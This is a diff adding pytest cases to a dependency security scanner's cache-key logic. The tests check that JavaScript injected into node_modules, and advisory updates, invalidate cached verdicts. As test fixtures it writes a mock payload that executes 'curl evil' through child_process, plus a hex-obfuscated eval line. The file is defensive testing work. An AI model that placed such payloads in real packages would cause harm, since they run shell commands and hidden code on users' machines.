@@ -227,13 +227,165 @@ class TestRuleReadSurfaceParity:
             assert _hash_target_inputs(tmp_path) != base, f"{rel} did not change the input hash"
             base = _hash_target_inputs(tmp_path)
 
-    def test_node_modules_non_manifest_files_still_skipped(self, tmp_path):
+    def test_node_modules_js_content_invalidates_cache(self, tmp_path):
+        """WO6.0.0-008 — JS-family content under node_modules (what L2-OBFS/
+        NETEX/CRED/WORM scan) must invalidate the cache. The old test
+        (test_node_modules_non_manifest_files_still_skipped) enshrined the
+        gap: a payload injected into node_modules/*/index.js after RUN1 was
+        invisible to the key, so RUN2 returned stale clean verdicts. Now the
+        key folds a bounded sample of node_modules JS content."""
         (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}', encoding="utf-8")
         base = _hash_target_inputs(tmp_path)
         payload = tmp_path / "node_modules" / "evil-pkg" / "lib"
         payload.mkdir(parents=True)
         (payload / "exploit.js").write_text("require('child_process').exec('curl evil')", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) != base
+
+    def test_node_modules_non_js_extensions_skipped(self, tmp_path):
+        """WO6.0.0-008 — only JS-family extensions (.js/.mjs/.cjs/.ts/.tsx)
+        under node_modules are hashed (the rules' read-surface). Non-JS files
+        (e.g. .md, .css) must not inflate the key. The base is established
+        AFTER node_modules exists so the structural nm-content separator is
+        already folded in; only the non-JS file additions are then tested."""
+        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}', encoding="utf-8")
+        pkg_dir = tmp_path / "node_modules" / "evil-pkg" / "lib"
+        pkg_dir.mkdir(parents=True)
+        # Establish base with node_modules present but empty of JS content.
+        (pkg_dir / "placeholder.txt").write_text("structural marker", encoding="utf-8")
+        base = _hash_target_inputs(tmp_path)
+        # Add non-JS files — these are NOT in the rules' read-surface.
+        (pkg_dir / "readme.md").write_text("not scan-relevant", encoding="utf-8")
+        (pkg_dir / "style.css").write_text(".x { color: red; }", encoding="utf-8")
         assert _hash_target_inputs(tmp_path) == base
+
+
+class TestNodeModulesContentHashing:
+    """WO6.0.0-008 — node_modules JS-family content the L2-OBFS/NETEX/CRED/
+    WORM rules scan must feed the cache key. The rules cap at
+    MAX_FILES_PER_PACKAGE=200 per installed package; the key mirrors that."""
+
+    def test_payload_injected_into_node_modules_index_js_invalidates(self, tmp_path):
+        """The exact WO-008 repro: RUN1 benign → inject eval+hex into
+        node_modules/evil-pkg/index.js → cache key must change."""
+        (tmp_path / "package.json").write_text('{"name": "host", "version": "1.0.0"}', encoding="utf-8")
+        evil = tmp_path / "node_modules" / "evil-pkg"
+        evil.mkdir(parents=True)
+        (evil / "package.json").write_text('{"name": "evil-pkg", "version": "1.0.0"}', encoding="utf-8")
+        (evil / "index.js").write_text("module.exports = {};", encoding="utf-8")
+        base = _hash_target_inputs(tmp_path)
+        # Inject the payload the rules WILL find.
+        (evil / "index.js").write_text("var s = '\\x65\\x76\\x61\\x6c'; eval(s);", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) != base
+
+    def test_all_js_family_extensions_invalidates(self, tmp_path):
+        """Every extension in the rules' JS_EXTENSIONS set must invalidate."""
+        from picosentry.scan.cli_service import _NM_JS_EXTENSIONS
+
+        (tmp_path / "package.json").write_text('{"name": "host"}', encoding="utf-8")
+        pkg = tmp_path / "node_modules" / "p"
+        pkg.mkdir(parents=True)
+        (pkg / "package.json").write_text('{"name": "p"}', encoding="utf-8")
+        for ext in sorted(_NM_JS_EXTENSIONS):
+            base = _hash_target_inputs(tmp_path)
+            f = pkg / f"file{ext}"
+            f.write_text("content-change", encoding="utf-8")
+            assert _hash_target_inputs(tmp_path) != base, f"{ext} did not change the input hash"
+            f.unlink()
+
+    def test_scoped_package_js_content_invalidates(self, tmp_path):
+        """@scope/pkg JS content must be hashed (the rules descend scopes)."""
+        (tmp_path / "package.json").write_text('{"name": "host"}', encoding="utf-8")
+        scoped = tmp_path / "node_modules" / "@scope" / "evil"
+        scoped.mkdir(parents=True)
+        (scoped / "package.json").write_text('{"name": "@scope/evil"}', encoding="utf-8")
+        (scoped / "lib.js").write_text("exports.x = 1;", encoding="utf-8")
+        base = _hash_target_inputs(tmp_path)
+        (scoped / "lib.js").write_text("exports.x = 2;", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) != base
+
+    def test_per_package_file_cap_is_bounded(self, tmp_path, monkeypatch):
+        """The key hashes at most _NM_MAX_FILES_PER_PKG JS files per package
+        (mirroring the rules). Files past the cap are not hashed — a
+        same-size edit past the cap is invisible (ceiling: annotated in
+        _hash_node_modules_content). This test pins the cap is enforced, not
+        that the ceiling is zero-cost: a file WITHIN the cap invalidates, a
+        file PAST the cap does not."""
+        monkeypatch.setattr("picosentry.scan.cli_service._NM_MAX_FILES_PER_PKG", 3)
+        (tmp_path / "package.json").write_text('{"name": "host"}', encoding="utf-8")
+        pkg = tmp_path / "node_modules" / "p"
+        pkg.mkdir(parents=True)
+        (pkg / "package.json").write_text('{"name": "p"}', encoding="utf-8")
+        # Fill the 3-file cap.
+        for i in range(3):
+            (pkg / f"f{i}.js").write_text(f"// {i}", encoding="utf-8")
+        base = _hash_target_inputs(tmp_path)
+        # A 4th file is past the cap — must NOT invalidate (bounded sample).
+        (pkg / "f3.js").write_text("// past the cap", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) == base
+        # An edit WITHIN the cap still invalidates.
+        (pkg / "f2.js").write_text("// edited within cap", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) != base
+
+    def test_node_modules_content_hash_deterministic(self, tmp_path):
+        """The bounded sample is sorted → same content, same hash."""
+        (tmp_path / "package.json").write_text('{"name": "host"}', encoding="utf-8")
+        pkg = tmp_path / "node_modules" / "p"
+        pkg.mkdir(parents=True)
+        (pkg / "package.json").write_text('{"name": "p"}', encoding="utf-8")
+        for i in range(5):
+            (pkg / f"f{i}.js").write_text(f"// {i}", encoding="utf-8")
+        assert _hash_target_inputs(tmp_path) == _hash_target_inputs(tmp_path)
+
+    def test_cli_service_nm_js_extensions_matches_rules(self):
+        """WO6.0.0-008 — the cache key's _NM_JS_EXTENSIONS must match the
+        JS_EXTENSIONS the L2-OBFS/NETEX/CRED/WORM rules scan, or the key
+        drifts from the read-surface (same property test as the build-hook
+        markers). All four rules share the identical set."""
+        from picosentry.scan.cli_service import _NM_JS_EXTENSIONS
+        from picosentry.scan.rules.obfuscation import JS_EXTENSIONS as OBFS_JS
+        from picosentry.scan.rules.network_exfil import JS_EXTENSIONS as NETEX_JS
+        from picosentry.scan.rules.credential_read import JS_EXTENSIONS as CRED_JS
+        from picosentry.scan.rules.worm_propagation import JS_EXTENSIONS as WORM_JS
+
+        assert _NM_JS_EXTENSIONS == OBFS_JS == NETEX_JS == CRED_JS == WORM_JS
+
+
+class TestAdvisoryDirDigestInCacheKey:
+    """WO6.0.0-019 rider — the default advisory dir's content must feed the
+    cache key so ``picosentry advisories fetch`` invalidates the cache.
+
+    Before this fix, an explicit --advisory-db path was digested, but the
+    default dir (used when no flag is passed) was not — a fetched advisory
+    set was invisible to the key and the cache served stale clean verdicts
+    until TTL expiry."""
+
+    def test_default_advisory_dir_update_invalidates_cache(self, tmp_path, monkeypatch):
+        # Point the default advisory dir at a temp dir we control.
+        adv_dir = tmp_path / "advisories"
+        adv_dir.mkdir()
+        monkeypatch.setenv("PICOSENTRY_ADVISORY_DIR", str(adv_dir))
+        # Clear any cached import of the env (default_advisory_dir reads env live).
+        cfg = PicoSentryConfig()  # no advisory_db set → uses default dir
+        assert cfg.advisory_db is None
+
+        digest1 = _cache_config_digest(cfg)
+
+        # Simulate ``picosentry advisories fetch`` writing a new advisory file.
+        (adv_dir / "GHSA-new.json").write_text(json.dumps({"id": "GHSA-new", "affected": []}), encoding="utf-8")
+        digest2 = _cache_config_digest(cfg)
+        assert digest1 != digest2, "advisory fetch did not invalidate the cache key"
+
+    def test_explicit_advisory_db_still_digested(self, tmp_path):
+        """An explicit --advisory-db path is digested as before (single file,
+        not the default dir)."""
+        adv_file = tmp_path / "custom-advisories.json"
+        adv_file.write_text("[]", encoding="utf-8")
+        cfg = PicoSentryConfig()
+        cfg.advisory_db = str(adv_file)
+        digest1 = _cache_config_digest(cfg)
+        adv_file.write_text('[{"id":"x"}]', encoding="utf-8")
+        digest2 = _cache_config_digest(cfg)
+        assert digest1 != digest2
 
 
 class TestTruncationMarker:
